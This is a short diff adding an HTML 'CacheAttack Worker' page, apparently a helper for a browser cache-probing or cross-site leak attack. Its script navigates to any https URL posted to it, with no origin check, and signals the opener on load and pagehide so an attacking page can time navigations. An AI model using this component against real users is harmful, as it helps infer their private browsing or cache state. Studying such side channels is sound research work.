@@ -1,0 +1,16 @@
+<title>CacheAttack Worker ~ loop</title>
+<h1>CacheAttack Worker ~ loop</h1>
+<script>
+window.addEventListener("message", function(event) {  
+  if(!event.data.startsWith("https://")) return
+  window.location = event.data;
+});
+  
+window.addEventListener("pagehide", event => {
+  window.opener.postMessage(true);
+});
+  
+window.addEventListener('load', (event) => {
+  window.opener.postMessage("load");
+});
+</script>
